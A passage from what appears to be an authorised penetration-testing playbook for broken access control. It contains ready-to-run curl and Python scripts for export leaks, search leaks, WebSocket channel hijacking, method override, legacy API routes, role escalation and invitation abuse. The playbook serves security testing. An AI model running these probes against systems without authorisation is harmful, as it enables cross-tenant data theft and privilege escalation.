  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/comments" -H 'Content-Type: application/json' \
    -d "{\"document_id\":\"<A document id>\",\"body\":\"bac007\",\"attachment_ids\":[\"$BFILE\"]}" | tee "$D/attach.json"
  # 3. read the result from A's side
  curl -sS "${HDR[@]}" $A "$T/api/v1/documents/<id returned in step 1>" -o "$D/result.json"; grep -c 'bac007-marker' "$D/result.json"
  ```
  Import variant: export one of A's own projects, edit the manifest so that one reference (an upload id, an
  attachment path, a linked issue id, an author id) points at B's object, import it, and read what the importer
  resolved (#743953, #767770). A "move" request takes the object away from B: use it only on an object B created
  for this test.
- **Proof:** the refused direct read, the create or import request, and A's new object containing B's marker.
- **Not a finding when:** the reference is rejected or silently dropped (the new object is empty or holds the
  default template). The new object stores only the id and opening the referenced part returns 403 or 404. The
  source is public or a shared template. The copy carries only metadata A could already see.
- **Escalate:** references that resolve to other object types (user records, tokens, CI variables, webhooks with
  secrets). Import by URL goes to SSR-001, archive entries with `../` to the LFI chapter. A copy that carries
  the source's member list or sharing settings goes to BAC-014.

### BAC-008 · An export, report or bulk-download job includes objects the caller cannot open directly

| | |
|---|---|
| **Severity** | High standalone when the file contains another tenant's records or data above the caller's role (billing, personal data); Medium for metadata |
| **Requires** | object-ids\|roles, two-accounts\|priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #1010835, #1559739, #2442008, #975749 |

- **Where:** "Export CSV", "Download all", "Generate report", scheduled reports sent to a recipient list, data
  takeout, analytics queries with a free-form scope, "download folder as zip" (#2247457), print views. Usually
  three requests: `POST /exports`, `GET /exports/<job id>`, `GET /exports/<job id>/download`.
- **Test:** three separate checks can each be missing. Who may start the job (role). Which objects the generator
  includes: it runs as a background worker with system rights and takes `ids`, `filter`, `account_id` or a date
  range from the request. Who may fetch the finished file (the job id).
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-008"; mkdir -p "$D"
  # control: the direct read is refused
  curl -sS "${HDR[@]}" $A -o /dev/null -w 'direct read of B invoice as A: %{http_code}\n' "$T/api/v1/invoices/<B invoice id>"
  # 1. scope: ask the generator for B's object, then for B's tenant. Never send an empty or "all" scope.
  for body in '{"type":"invoices","ids":["<A invoice id>","<B invoice id>"]}' \
              '{"type":"invoices","account_id":"<B tenant id>"}' \
              '{"type":"invoices","filter":{"owner_id":"<B user id>"}}'; do
    curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/exports" -H 'Content-Type: application/json' -d "$body" | tee -a "$D/jobs.jsonl"; echo; sleep 2; done
  # 2. fetch each finished file as A and look for B's marker
  curl -sS "${HDR[@]}" $A "$T/api/v1/exports/<job id>/download" -o "$D/export-A.csv"; head -1 "$D/export-A.csv"; grep -c '<marker in B invoice>' "$D/export-A.csv"
  # 3. job id: B starts an export, A asks for B's job and B's file
  curl -sS "${HDR[@]}" $B -X POST "$T/api/v1/exports" -H 'Content-Type: application/json' -d '{"type":"invoices"}' | tee "$D/job-B.json"
  for p in "" /status /download; do
    curl -sS "${HDR[@]}" $A -o "$D/bjob$(echo "$p" | tr / _).bin" -w "A on B job$p: %{http_code} %{size_download}\n" "$T/api/v1/exports/<B job id>$p"; sleep 1; done
  # 4. role (priv-accounts): the low-privilege member A starts an export the UI offers only to admins
  curl -sS -i "${HDR[@]}" $A -X POST "$T/api/v1/exports" -H 'Content-Type: application/json' -d '{"type":"billing_charges"}' | head -20
  # 5. recipient: a scheduled report of B delivered to an address the request names
  curl -sS -i "${HDR[@]}" $A -X POST "$T/api/v1/reports/<B report id>/schedule" -H 'Content-Type: application/json' -d '{"recipients":["<A e-mail alias>"]}' | head -15
  ```
  If a file contains rows that are neither A's nor B's, stop: keep the header line and the row count, delete the
  file, and report with that.
- **Proof:** the refused direct read, the export request, and the row of the file that carries B's marker. For
  the role case: the file in the member's hands next to the permission table that reserves it for admins.
- **Not a finding when:** the file holds only A's rows whatever scope was sent. The role may export according
  to the product's documentation. The file is e-mailed to the tenant owner and not to the requester. Step 3
  works only with a job id that is unguessable and that nothing discloses: park it and see BAC-005.
- **Escalate:** the download URL of the finished file goes to BAC-004. Columns the UI never shows (hashes,
  tokens, internal notes) are excessive data exposure even in our own export: INF and API chapters. A report
  rendered from HTML goes to SSR-007. Formula cells are `csv-injection` and belong in the graveyard.

### BAC-009 · Search, filter, sort or autocomplete returns or confirms objects the caller cannot open

| | |
|---|---|
| **Severity** | Medium standalone when private titles or snippets are returned; High when message bodies, documents or personal data cross a tenant boundary; Low for an existence or count oracle |
| **Requires** | params, two-accounts\|priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #80936, #692252, #912161, #685909 |

- **Where:** global search, per-type search, autocomplete and mention pickers (`/search?q=`, `/autocomplete`,
  `/suggest`, `/api/v1/users?query=`), list endpoints that accept `filter`, `where`, `sort`, `order_by`,
  `fields`, `include` or `expand`, facet counts, activity feeds and "recently viewed" lists.
- **Test:** the index is built from every record. The permission filter lives in the list view and is missing
  from the suggest endpoint, from a second index, from an `include=` expansion, or from filtering and sorting on
  a field the caller may not read. B stores a unique word in a private object; A searches for it.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-009"; mkdir -p "$D"
  M='zqxbac009'          # B has stored this word in the title and in the body of one private object
  grep -rhoE '/[A-Za-z0-9_/.-]*(search|autocomplete|suggest|typeahead|lookup|query|find|filter|mentions)[A-Za-z0-9_/.-]*' \
    "$E/recon/$H/requests/" "$E/recon/$H/routes-from-js.txt" | sort -u
  # 1. A searches for B's word: whole, as a prefix, and in each scope the endpoint accepts
  for u in "/api/v1/search?q=$M" "/api/v1/search?q=${M:0:6}" "/api/v1/search?q=$M&scope=all" "/api/v1/search?q=$M&type=documents&include_private=true" \
           "/api/v1/autocomplete?term=${M:0:6}" "/api/v1/documents?filter[title]=$M" "/api/v1/documents?q=$M&org_id=<B tenant id>"; do
    printf '%-74s ' "$u"; curl -sS -g "${HDR[@]}" $A "$T$u" -o "$D/r.json" -w '%{http_code} %{size_download} hits='; grep -c "$M" "$D/r.json"; sleep 1; done | tee "$D/search.txt"
  # 2. expansion: a list A may see, with a relation A may not
  curl -sS -g "${HDR[@]}" $A "$T/api/v1/projects?include=owner,members,billing,private_notes&expand[]=owner.email" | jq -c '(.data // .)[0]' | head -c 600
  # 3. filter on a field A cannot read, as an oracle on B's own record: does the answer follow the guess?
  for g in a b c; do curl -sS -g "${HDR[@]}" $A -o /dev/null -w "$g %{http_code} %{size_download}\n" "$T/api/v1/users?filter[id]=<B user id>&filter[email][starts_with]=$g"; sleep 1; done
  ```
  Search only for the marker. A query for common words returns real users' content.
- **Proof:** A's search response with B's private title, snippet or body around the marker, B's view showing the
  object as private, and A's refused direct read as the control. For an oracle: the responses that spell the
  first three characters of a value B set, and no more.
- **Not a finding when:** the hit is an object A may read by design (public, or shared in the same tenant). Only
  a count or "1 result" comes back with no content. A user search that confirms a username or an e-mail exists
  is `user-enum`. The difference is timing only. The result is A's own deleted object.
- **Escalate:** an index queried directly from the browser with a search key (Algolia, Elasticsearch) goes to
  the INF chapter: check what the key may read. GraphQL filters and aggregates are GQL-003. Filter values that
  reach a query language go to the SQL and NSQ chapters.

### BAC-010 · A WebSocket or event-stream subscription named by an id delivers another account's events

| | |
|---|---|
| **Severity** | High standalone when private messages, notifications or document content of another account arrive; Medium for presence or metadata events |
| **Requires** | websocket, two-accounts\|priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authorization · CWE-285 |
| **Prior art** | #1314162, #1023669, #1102780, #2209750 |

- **Where:** the socket endpoint and its subscribe frames, read from the bundles and from one captured session:
  channel, topic or room names that carry ids (`user:<id>`, `private-org.<id>`, `conversation-<id>`), the
  subscribe messages of Pusher, Ably, Socket.IO, ActionCable, Phoenix and SignalR, the HTTP endpoint that signs
  channel names (`/pusher/auth`, `/broadcasting/auth`), and server-sent events (`/events?channel=`).
- **Test:** the HTTP API checks every request; the socket authenticates once at connect and then lets the client
  name the channel, or the signing endpoint signs any channel name for any logged-in user. Connect as A,
  subscribe to B's channel, let B trigger one event.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-010"; mkdir -p "$D"
  grep -rhoE "(wss?://[^\"' ]+|private-[A-Za-z0-9_.-]+|presence-[A-Za-z0-9_.-]+|/(pusher|broadcasting)/auth|/cable|/socket\.io/|/hubs?/[A-Za-z]+)" "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -30
  # 1. signing endpoint: does it sign B's channel for A? (socket_id is the one A's own connection was given)
  curl -sS "${HDR[@]}" $A -X POST "$T/broadcasting/auth" -d 'socket_id=1234.5678' -d 'channel_name=private-user.<B user id>' -w '\n%{http_code}\n'
  # 2. raw socket as A, with the subscribe frame the client sends and B's id in it
  python3 - "$H" "$E/accounts/A.headers" '<B user id>' <<'PY' | tee "$D/frames-as-A.txt"
  # pip install 'websockets>=12'; add the programme's required headers to hdrs
  import json, sys, time
  from websockets.sync.client import connect
  host, hdr_file, buid = sys.argv[1:4]
  hdrs = dict(l.rstrip("\n").split(": ", 1) for l in open(hdr_file) if ": " in l)
  ws = connect(f"wss://{host}/cable", additional_headers=hdrs, origin=f"https://{host}")
  ws.send(json.dumps({"command": "subscribe", "identifier": json.dumps({"channel": "NotificationsChannel", "user_id": buid})}))
  end = time.time() + 120      # within these two minutes B triggers one event: B edits its private note or messages itself
  while time.time() < end:
      try: print(time.strftime("%H:%M:%S"), str(ws.recv(timeout=5))[:400], flush=True)
      except TimeoutError: pass
  PY
  ```
  Subscribe frames of the other protocols:
  ```text
  Socket.IO     42["join",{"room":"user:<B id>"}]              42["subscribe","org.<B tenant id>.events"]
  Phoenix       ["1","1","room:<B id>","phx_join",{}]
  Pusher        {"event":"pusher:subscribe","data":{"channel":"private-user.<B id>","auth":"<signature from step 1>"}}
  SignalR       {"type":1,"target":"JoinGroup","arguments":["tenant-<B tenant id>"]} followed by the byte 0x1e
  SSE           curl -N "${HDR[@]}" $A -H 'Accept: text/event-stream' "$T/events?channel=user-<B id>"
  ```
- **Proof:** a frame received on A's connection that carries B's marker text, with two timestamps: B's
  triggering request and A's received frame. The subscribe frame A sent, and A's refused HTTP read of the same
  object as the control.
- **Not a finding when:** the subscription is acknowledged and no event ever arrives: many servers accept any
  channel name and filter at publish time. The channel is public by design. The signing endpoint returns a
  signature and the socket server still rejects the subscription. Events carry only ids or counters.
- **Escalate:** publishing into B's channel (a frame B's client renders) goes to the XSS chapter or is a spoofed
  notification. Try the same subscription with no session at all. Another site opening the socket with the
  victim's cookies is the WSS chapter. GraphQL subscriptions are GQL-011.

### BAC-011 · A low-privilege role performs an administrative function by calling its endpoint directly

| | |
|---|---|
| **Severity** | High standalone when the low role performs an admin write (members, billing, API keys, security settings); Medium for admin-only reads; Critical when the function reaches other tenants |
| **Requires** | roles, priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Privilege Escalation · CWE-269 |
| **Prior art** | #1177451, #980511, #1555502, #860348 |

- **Where:** every request captured in the admin's session that the member's UI does not offer (the "who may use
  it" column of `$E/recon/$H/map.md`): member and role management, invitations, billing and plan, API keys and
  tokens, webhooks and integrations, SSO and security settings, audit log, exports, deletion of shared objects,
  impersonation. Add the admin routes in the bundles that neither UI called (`/admin/`, `/internal/`,
  `/manage/`, `/staff/`, feature-flagged routes).
- **Test:** the UI hides the button; the endpoint checks only that the caller belongs to the tenant. Replay each
  admin request with the member's session, changing nothing but the session and its CSRF token, and read the
  resulting state from the admin's session.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-011"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  ADMIN="-H @$E/accounts/ADM.headers"          # the admin of A's tenant; $A is the low-privilege member of the same tenant
  curl -sS "${HDR[@]}" $A "$T/api/v1/me" | jq -c '{id,role,permissions}'; curl -sS "${HDR[@]}" $ADMIN "$T/api/v1/me" | jq -c '{id,role}'
  # 1. reads. admin-gets.txt: one admin-only path per line (member list with e-mails, billing, audit log, tokens, settings)
  while read -r p; do
    a=$(curl -sS "${HDR[@]}" $ADMIN -o "$D/adm.body" -w '%{http_code} %{size_download}' "$T$p"); sleep "$W"
    m=$(curl -sS "${HDR[@]}" $A     -o "$D/mem.body" -w '%{http_code} %{size_download}' "$T$p"); sleep "$W"
    n=$(curl -sS "${HDR[@]}"        -o /dev/null     -w '%{http_code} %{size_download}' "$T$p"); sleep "$W"
    cmp -s "$D/adm.body" "$D/mem.body" && same=SAME || same=diff
    printf '%-48s admin[%s] member[%s] anon[%s] %s\n' "$p" "$a" "$m" "$n" "$same"; done < "$D/admin-gets.txt" | tee "$D/matrix.txt"
  # 2. writes: the admin's request replayed as the member with a harmless value, then the state read as the admin
  curl -sS -i "${HDR[@]}" $A -X PATCH "$T/api/v1/orgs/<tenant id>/settings" -H 'Content-Type: application/json' -d '{"description":"bac011"}' -o "$D/write-as-member.txt"
  curl -sS "${HDR[@]}" $ADMIN "$T/api/v1/orgs/<tenant id>/settings" | jq -c '{description}'
  curl -sS -i "${HDR[@]}" $A -X POST "$T/api/v1/orgs/<tenant id>/api-keys" -H 'Content-Type: application/json' -d '{"name":"bac011","scopes":["read"]}' | head -20
  curl -sS "${HDR[@]}" $ADMIN "$T/api/v1/orgs/<tenant id>/api-keys" | jq -c '.[] | select(.name=="bac011")'
  # 3. admin routes in the bundles that no UI called
  grep -hoE '/(api/)?(v[0-9]+/)?(admin|internal|manage|staff|backoffice|superuser|support)[A-Za-z0-9_/.{}:-]*' "$E/recon/$H/routes-from-js.txt" | sort -u | head -40
  ```
  Revert each write from the admin session and list it in `cleanup.md`.
- **Proof:** the member's request and its 2xx response, the changed state read from the admin session, and the
  product's permission table or the member's UI showing the function is not offered to that role. For a read:
  admin-only data in the member's response.
- **Not a finding when:** the `/admin` route returns the SPA shell to everyone and each API call behind it is
  refused. The member gets 200 with an empty list or only its own rows. The permission table grants the function
  to that role. The response says 200 and the admin's view shows no change. We gave the member a custom role
  that includes the permission.
- **Escalate:** a member that can create a key with admin scope, invite an admin or change a role has escalated:
  BAC-014. The same function with another tenant's id is BAC-006. The same function with no session is missing
  authentication (AUT chapter). Refused functions go to BAC-012 (other methods) and BAC-013 (other API
  surfaces).

### BAC-012 · An operation refused on its documented method succeeds when the HTTP method is changed or overridden

| | |
|---|---|
| **Severity** | High standalone when a refused write or a refused private read succeeds through another method; Medium when only a low-impact action is reached |
| **Requires** | object-ids\|roles, two-accounts\|priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Incorrect Authorization · CWE-863 |
| **Prior art** | #2456603, #384782, #2149124 |

- **Where:** every request that was refused (401, 403, 405) in BAC-001, BAC-003 or BAC-011: A on B's object, or
  the member on an admin route. The cause is a rule bound to a method: a route declaration guarded for POST
  only, an Apache `<Limit GET POST>` or nginx `limit_except` block, a gateway authoriser per method, a security
  configuration that lists methods explicitly.
- **Test:** authorisation is attached to the pair of method and path, and the handler answers more methods than
  the rule covers. Or the framework honours a method-override header or parameter after the outer method was
  authorised.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-012"; mkdir -p "$D"
  U="$T/api/v1/notes/<id of a note B created for this test>"; BODY='{"title":"bac012"}'
  # 0. baseline: the documented method is refused for A
  curl -sS "${HDR[@]}" $A -X PATCH "$U" -H 'Content-Type: application/json' -d "$BODY" -o /dev/null -w 'PATCH %{http_code}\n'
  # 1. sibling methods mapped to the same handler
  for m in PUT POST; do curl -sS "${HDR[@]}" $A -X "$m" "$U" -H 'Content-Type: application/json' -d "$BODY" -o "$D/$m.body" -w "$m %{http_code} %{size_download}\n"; sleep 1; done
  curl -sS "${HDR[@]}" $A -X OPTIONS "$U" -D- -o /dev/null | grep -i '^allow'
  # 2. override: an allowed outer method carrying the refused one
  for h in X-HTTP-Method-Override X-HTTP-Method X-Method-Override; do
    curl -sS "${HDR[@]}" $A -X POST "$U" -H "$h: PATCH" -H 'Content-Type: application/json' -d "$BODY" -o /dev/null -w "POST + $h: PATCH -> %{http_code}\n"; sleep 1; done
  curl -sS "${HDR[@]}" $A -X POST "$U?_method=PATCH" -H 'Content-Type: application/json' -d "$BODY" -o /dev/null -w 'POST ?_method=PATCH -> %{http_code}\n'
  curl -sS "${HDR[@]}" $A -X POST "$U" -d '_method=PATCH' -d 'title=bac012' -o /dev/null -w 'POST form _method=PATCH -> %{http_code}\n'
  # 3. reads: a refused GET through POST, an override, a body, or a method name the rule does not list
  curl -sS "${HDR[@]}" $A "$U" -o /dev/null -w 'GET %{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'X-HTTP-Method-Override: GET' -o "$D/read-override.body" -w 'POST + override GET %{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" $A -X GET "$U" -H 'Content-Type: application/json' -d '{}' -o "$D/read-getbody.body" -w 'GET with body %{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" $A -X FOO "$U" -o "$D/read-foo.body" -w 'FOO %{http_code} %{size_download}\n'
  # 4. B's view decides
  curl -sS "${HDR[@]}" $B "$U" | jq -c '{id,title}'
  ```
  Send DELETE only when the refused operation is itself a delete, and only at an object B created to be deleted.
  For the vertical case run the same steps with the member's session on an admin route from BAC-011.
- **Proof:** the refusal on the documented method and the success on the other one, same session and same URL,
  then B's view showing the change (writes) or B's marker in A's response (reads).
- **Not a finding when:** HEAD or OPTIONS answer 200 with headers only. The answer is 405, or 200 with an error
  or login page. The other method maps to a different, permitted action (POST on an item URL creating A's own
  object). The override is honoured and authorisation still refuses. B's view is unchanged. "PUT is enabled" or
  "TRACE is enabled" on a host is informative, not this item.
- **Escalate:** a state change accepted over GET is CSRF by a plain link (CSR chapter). An edge that blocks a
  method and passes its override combines with BAC-018. A method swap that works on one route usually works on
  every route of that controller: sweep it and report one root cause. The three disclosed examples carried no
  bounty: the payout follows the operation reached, not the trick.

### BAC-013 · An older or alternate API surface serves an operation without the check the current one enforces

| | |
|---|---|
| **Severity** | High standalone when a refused cross-account or admin operation succeeds on another surface; Medium for reads of limited data |
| **Requires** | api, object-ids\|roles, two-accounts\|priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #186279, #349291, #1584409, #271393 |

- **Where:** version segments (`/v1/` to `/v3/`, dated versions, `?version=`, `X-API-Version`,
  `Accept: application/vnd.<app>.v1+json`), sibling prefixes (`/api/internal/`, `/internal_api/`,
  `/api/mobile/`, `/api_android_v3/`, `/rest/`, `/ajax/`, `/private/`, `/beta/`, `/partner/`), legacy
  controller routes that are still mounted, the mobile and partner API hosts when they are in scope, and the
  public API used with an API key in place of the web session.
- **Test:** the permission model, or the fix for an earlier report, was applied to the routes the current client
  calls. Older versions, the mobile API and the internal API have their own controllers over the same database.
  Send each request that BAC-001, BAC-003 or BAC-011 saw refused to every other surface.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-013"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  # 1. which versions and prefixes exist? bundles, API documentation, error messages
  grep -rhoE '/(api[_/-]?(v[0-9]+|internal|mobile|private|beta|partner|android[_a-z0-9]*|ios[_a-z0-9]*)?|v[0-9]+(\.[0-9]+)?|internal_api|rest|ajax)/' "$E/recon/$H/" | sort | uniq -c | sort -rn | head -30
  # 2. one refused request on every surface. P is the resource part after the version prefix.
  P='users/<B user id>/addresses'
  curl -sS "${HDR[@]}" $A -o /dev/null -w 'control, current version: %{http_code}\n' "$T/api/v3/$P"
  for pre in /api/v2 /api/v1 /api /v3 /v2 /v1 /api/internal /internal_api /api/mobile/v1 /api/private /rest /api/v1.0 /api/beta; do
    curl -sS "${HDR[@]}" $A -o "$D/$(echo "$pre" | tr / _).body" -w "%{http_code} %{size_download} $pre/$P\n" "$T$pre/$P"; sleep "$W"; done | tee "$D/versions.txt"
  # 3. version selected by header or parameter on the current URL
  for h in 'Accept: application/vnd.api.v1+json' 'X-API-Version: 1' 'Api-Version: 2018-01-01'; do
    curl -sS "${HDR[@]}" $A -H "$h" -o /dev/null -w "%{http_code} %{size_download} [$h]\n" "$T/api/v3/$P"; sleep "$W"; done
  curl -sS "${HDR[@]}" $A -o /dev/null -w '%{http_code} %{size_download} ?version=1\n' "$T/api/$P?version=1&api_version=1"
  # 4. the same resource with A's API key in place of the web session
  curl -sS "${HDR[@]}" -H 'Authorization: Bearer <A API key>' -o "$D/apikey.body" -w '%{http_code} %{size_download} API key\n' "$T/api/v3/$P"
  grep -l '<marker in B address>' "$D"/*.body
  ```
  Keep the programme's User-Agent: do not imitate the mobile client's.
- **Proof:** one session and one object: refused on the current surface, served on the other, with B's marker in
  the response. Name both routes in the report.
- **Not a finding when:** the old prefix reaches the same handler and refuses identically. The answer is 404 or
  410, or A's own data. The other surface needs credentials A cannot obtain (partner keys). The old version
  returns a documented public subset. The host that answers is out of scope.
- **Escalate:** one unguarded legacy controller usually means the whole old version is unguarded: run the
  BAC-003 and BAC-011 lists against it and report the surface, not each route. API descriptions of old versions
  (`/v1/swagger.json`) go to the API chapter. An API key that outlives its owner's membership is BAC-017.

### BAC-014 · A member raises its own role, or grants a role above its own, through a role or permission field

| | |
|---|---|
| **Severity** | High standalone for member to admin inside the tenant; Critical when the role is global (staff, superuser) or the tenant owner is replaced; Medium when an admin exceeds a documented limit |
| **Requires** | roles, priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Privilege Escalation · CWE-269 |
| **Prior art** | #2281075, #42961, #605720, #99863 |

- **Where:** requests that carry a role: member update, invitation create and accept, own-profile update,
  sign-up and onboarding, API-key creation (`scopes`), group or access-list membership, custom-role editors.
  Field names: `role`, `roles[]`, `role_id`, `is_admin`, `admin`, `is_staff`, `permissions[]`, `scopes`,
  `access_level`, `type`, `group_ids`, `owner_id`, `account_type`.
- **Test:** four cases. The member calls the role-change endpoint on itself. A role field is added to a request
  the member may send and the server binds it. A role that may manage members grants a role above its own, or
  edits a group or access list it belongs to (#2281075). The request names a system role id or a custom role of
  another tenant.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-014"; mkdir -p "$D"
  ADMIN="-H @$E/accounts/ADM.headers"          # the admin of A's tenant; $A is the low-privilege member of the same tenant
  AID='<A user id>'; MID='<A membership id>'; ORG='<tenant id>'
  curl -sS "${HDR[@]}" $A "$T/api/v1/me" | tee "$D/01-me-before.json" | jq -c '{id,role,roles,permissions,is_admin}'
  # capture the admin's own role-change request once: its path and its value for "admin" are the template
  # 1. the member sends it for itself
  curl -sS -i "${HDR[@]}" $A -X PATCH "$T/api/v1/orgs/$ORG/members/$MID" -H 'Content-Type: application/json' -d '{"role":"admin"}' -o "$D/02-role-change-as-member.txt"
  # 2. role fields on a request the member may send
  for body in '{"role":"admin"}' '{"roles":["admin"]}' '{"role_id":1}' '{"is_admin":true}' '{"admin":true}' '{"permissions":["*"]}' \
              '{"access_level":50}' '{"user":{"role":"admin"}}' '{"membership":{"role":"owner"}}' '{"type":"admin"}'; do
    curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/users/$AID" -H 'Content-Type: application/json' -d "$body" -o /dev/null -w "%{http_code} $body\n"; sleep 1; done | tee "$D/03-profile-fields.txt"
  # 3. a key with more scope than its creator
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/api-keys" -H 'Content-Type: application/json' -d '{"name":"bac014","scopes":["admin","members:write"],"role":"admin"}' | tee "$D/04-key.json"
  # 4. what the server believes now, and one admin-only read as proof of effect
  curl -sS "${HDR[@]}" $A "$T/api/v1/me" | tee "$D/05-me-after.json" | jq -c '{id,role,roles,permissions,is_admin}'
  curl -sS "${HDR[@]}" $A "$T/api/v1/orgs/$ORG/audit-log" -o "$D/06-admin-read.json" -w 'admin-only read as the member: %{http_code} %{size_download}\n'
  curl -sS "${HDR[@]}" $ADMIN "$T/api/v1/orgs/$ORG/members" | jq -c '.[] | {id,email,role}' | tee "$D/07-members-as-admin.json"
  ```
  Afterwards the admin sets the member's role back and deletes the key; record both in `cleanup.md`.
- **Proof:** `me` before and after as the member, the request between them, the admin's member list showing the
  new role, and one admin-only read that now succeeds.
- **Not a finding when:** the response echoes `"role":"admin"` and a fresh `me` still says member. The field is
  stored and nothing enforces it (the admin-only read is still refused): a label, not a privilege. The acting
  role may grant that role according to the documentation. The account type is a sign-up choice by design
  (buyer or seller). Admin to owner inside one tenant is rated low on programmes that treat admins as trusted.
- **Escalate:** a global flag (`is_staff`, `is_superuser`, `internal`) that sticks reaches every tenant: prove
  it with one read of a staff-only route and stop. A role claim inside a client-held token goes to JWT-001 and
  JWT-002. The same fields at invitation accept are BAC-015. A sweep of every writable object for unlisted
  fields is the API chapter (mass assignment).

### BAC-015 · An invitation is redeemed by an account, into a role or into a tenant other than the one it was issued for

| | |
|---|---|
| **Severity** | High standalone when an outsider joins a tenant or receives a role nobody granted; Critical when the result is the owner role; Medium for reading another tenant's pending invitations |
| **Requires** | invite, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authorization · CWE-285 |
| **Prior art** | #835005, #47932, #283014, #2885269 |

- **Where:** invitation create, list, read, accept, resend and revoke requests, the link in the invitation
  e-mail, and the sign-up page it leads to.
- **Test:** an invitation binds a tenant, a role, a recipient and a lifetime. Test each binding at the point of
  redemption: a token issued to one e-mail accepted by a session of another; a role or tenant repeated in the
  accept request and trusted there; an invitation readable or acceptable by its sequential id in place of the
  secret token; a revoked, expired or used invitation that still redeems; an invitation created by A that names
  B's tenant.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-015"; mkdir -p "$D"; BT='<B tenant id>'
  # setup: B, owner of its tenant, invites an alias we control (not A's address) at the lowest role
  curl -sS "${HDR[@]}" $B -X POST "$T/api/v1/orgs/$BT/invitations" -H 'Content-Type: application/json' \
    -d '{"email":"<alias we control>","role":"viewer"}' | tee "$D/01-invite-by-B.json"
  TOK='<token from the invitation e-mail>'; IID='<invitation id from 01-invite-by-B.json>'
  # 1. what the token shows without a session; the same invitation by id; the tenant's invitation list
  curl -sS "${HDR[@]}" "$T/api/v1/invitations/$TOK" | tee "$D/02-read-anon.json"
  curl -sS "${HDR[@]}" $A "$T/api/v1/invitations/$IID" -o "$D/03-read-by-id-as-A.json" -w 'by id as A: %{http_code}\n'
  curl -sS "${HDR[@]}" $A "$T/api/v1/orgs/$BT/invitations" -o "$D/04-list-as-A.json" -w 'list as A: %{http_code} %{size_download}\n'
  # 2. recipient and role binding: A, a different address, accepts and asks for more
  curl -sS -i "${HDR[@]}" $A -X POST "$T/api/v1/invitations/$TOK/accept" -H 'Content-Type: application/json' -d '{"role":"owner"}' -o "$D/05-accept-as-A.txt"
  curl -sS "${HDR[@]}" $B "$T/api/v1/orgs/$BT/members" | jq -c '.[] | {email,role}' | tee "$D/06-members-as-B.json"
  # 3. lifetime: B revokes a second invitation, then A tries to redeem it
  curl -sS "${HDR[@]}" $B -X DELETE "$T/api/v1/invitations/<second invitation id>" -o /dev/null -w 'revoke: %{http_code}\n'
  curl -sS -i "${HDR[@]}" $A -X POST "$T/api/v1/invitations/<second token>/accept" | head -12
  # 4. create: A invites its own alias into B's tenant
  curl -sS -i "${HDR[@]}" $A -X POST "$T/api/v1/orgs/$BT/invitations" -H 'Content-Type: application/json' -d '{"email":"<A alias>","role":"admin"}' | head -12
  ```
  B removes the unwanted member afterwards; list it in `cleanup.md`.
- **Proof:** B's member list showing A, or A's alias, with a membership or role B never granted, next to the
  accept or create request. For a read: an invitation of B's tenant (address and role) in A's response.
- **Not a finding when:** the product documents the link as a reusable join link ("anyone with this link can
  join"): no recipient binding was promised. A joined with exactly the role B chose and the extra `role` field
  was ignored. The invitation page shows only the tenant and inviter names it needs to render. An expired
  invitation works inside its documented validity.
- **Escalate:** an accept flow that creates or logs in the invited address without verifying it is account
  pre-creation or takeover (AUT chapter, #915110). A single-use token redeemed twice in parallel is the RAC
  chapter. A pending invitation that survives the removal of the member who sent it (#3303136) is BAC-017. A
  member-level account creating invitations inside its own tenant is BAC-011.

### BAC-016 · A share link for one object or for read-only access reaches other objects, allows writes or outlives revocation

| | |
|---|---|
| **Severity** | High standalone when a link to one object exposes other private objects of its owner; Medium for writes through a read-only link or access after revocation; Low for a download where only viewing was intended |
| **Requires** | invite, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #194790, #214001, #2289425, #452854 |

- **Where:** "Share", "Get link", "Publish", "Anyone with the link", password-protected and expiring links,
  embeds, public folders, file-request links; the public routes behind them (`/s/<token>`, `/share/<token>/`,
  `/public/`, `?share_token=`, `X-Share-Token`) and the API calls the public page makes with the token.
- **Test:** the token authenticates the visitor for one object and one permission. Test its object scope
  (sibling ids, the parent folder, attachments, versions, comments, the owner's profile), its permission scope
  (write, delete, re-share, the share's own settings), its lifetime (revoked, expired, password changed), and
  whether the password or expiry is enforced by the API or only by the page.
- **How:**
  ```bash
  D="$E/evidence/$H/BAC-016"; mkdir -p "$D"
  # setup as B: two private documents with markers; a view-only link to the first one only
  curl -sS "${HDR[@]}" $B -X POST "$T/api/v1/documents/<B doc 1>/share" -H 'Content-Type: application/json' -d '{"permission":"view"}' | tee "$D/01-share.json"
  TOK='<share token>'; S="$T/api/v1/shares/$TOK"
  # what the public page calls with the token: read it from the bundle or from the page's network log, then replay
